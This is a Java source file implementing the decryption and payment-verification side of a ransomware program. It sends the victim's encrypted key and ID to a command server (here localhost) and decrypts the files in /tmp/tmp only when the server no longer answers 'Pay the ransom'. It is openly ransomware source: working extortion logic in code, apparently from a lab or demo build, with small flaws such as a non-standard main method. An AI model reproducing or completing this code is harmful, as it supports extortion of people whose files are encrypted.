import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.spec.KeySpec;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;
import java.util.stream.Stream;

class secret {
	private static SecretKeySpec secrets;
	private static byte[] iV;

	void setKey(String myKey) throws Exception{
		//readig salt
		FileInputStream saltFis = new FileInputStream("/tmp/tmp/salt.enc");
		byte[] salt = new byte[8];
		saltFis.read(salt);
		saltFis.close();
		FileInputStream ivFis = new FileInputStream("/tmp/tmp/iv.enc");
		iV = new byte[16];
		ivFis.read(iV);
		ivFis.close();
		SecretKeyFactory factory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1");
		KeySpec keySpec = new PBEKeySpec(myKey.toCharArray(), salt, 65536,256);
		SecretKey tmp = factory.generateSecret(keySpec);
		secrets = new SecretKeySpec(tmp.getEncoded(), "AES");
	}
	void decryptFiles(String inputFile, String outputFile) throws Exception{
		Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
		cipher.init(Cipher.DECRYPT_MODE, secrets,new IvParameterSpec(iV));

		byte[] textString = new byte[64];
		FileOutputStream fileOutputStream = new FileOutputStream(outputFile);
		FileInputStream fileInputStream = new FileInputStream(inputFile);
		int count;
		while((count = fileInputStream.read(textString)) != -1){
			byte[] output = cipher.update(textString, 0, count);
			if (output != null){
				fileOutputStream.write(output);
			}
		}
		byte[] output = cipher.doFinal();
		if (output != null)
			fileOutputStream.write(output);
		fileInputStream.close();
		fileOutputStream.flush();
		fileOutputStream.close();
	}
}

class RansomwareDeactivate{
	void decryptAllFiles(String key) throws Exception{
		secret sec = new secret();
		sec.setKey(key);
		List<Path> fileNames = new ArrayList<>();
		Stream<Path> paths = Files.walk(Paths.get("/tmp/tmp/"));
		paths.filter(Files::isRegularFile).forEach(fileNames::add);
		Path salt_path = Paths.get("/tmp/tmp/salt.enc");
		Path iv_path = Paths.get("/tmp/tmp/iv.enc");
		Path key_path = Paths.get("/tmp/tmp/key.enc");
		Path id_path = Paths.get("/tmp/tmp/id.enc");
		fileNames.remove(salt_path);
		fileNames.remove(iv_path);
		fileNames.remove(key_path);
		boolean remove = fileNames.remove(id_path);
		for(Path file:fileNames){
			try{	
				System.out.println("Decrypting file: "+file.toString());
				String inputFile = file.toString();
				String outputFile = inputFile.substring(0, inputFile.lastIndexOf('.'));
				sec.decryptFiles(inputFile,outputFile);
				File f = new File(inputFile);
				f.delete();
			}
			catch (Exception ignored){
			}
		}
	}
}

class decrypt {
	static void activate(String ans) throws Exception{
		RansomwareDeactivate ransomware = new RansomwareDeactivate();
		ransomware.decryptAllFiles(ans);
	}

    static boolean validatePayment() throws Exception{
        //ID is the victim's ID
        File file = new File("/tmp/tmp/key.enc");
        File file2 = new File("/tmp/tmp/id.enc");
        String encoded_key;
		String modifiedKey;
		String encoded_id;
		String modifiedId;
		byte[] encKey = Files.readAllBytes(file.toPath());
		byte[] encid = Files.readAllBytes(file2.toPath());
		encoded_key = Base64.getEncoder().encodeToString(encKey);
		encoded_id = Base64.getEncoder().encodeToString(encid);
		modifiedKey = encoded_key.replace('+', '-');
		modifiedId = encoded_id.replace('+','-');
		URL obj = new URL("http://127.0.0.1/recv.php?decrypt="+modifiedKey+"&id="+modifiedId);
		HttpURLConnection con = (HttpURLConnection) obj.openConnection();
		con.setRequestMethod("GET");
		con.addRequestProperty("Victim", "Yes");
		BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
		String inputLine;
		StringBuilder response = new StringBuilder();
		while((inputLine = in.readLine()) != null){
			response.append(inputLine);
            }
		in.close();
		String ans = response.toString();
		if(ans.equals("Pay the ransom")){
			return false;
			}
		else if(ans == null){
			return false;
		}
		else {
			activate(ans);
			cleanup();
			return true;
		}
    }

	static void cleanup() throws Exception{
		File f = new File("/tmp/tmp/key.enc");
		f.delete();
		f = new File("/tmp/tmp/iv.enc");
		f.delete();
		f = new File("/tmp/tmp/salt.enc");
		f.delete();
		f = new File("/tmp/tmp/id.enc");
		f.delete();
	}

	public static boolean main(String[] args) throws Exception{
		return validatePayment();
	}
}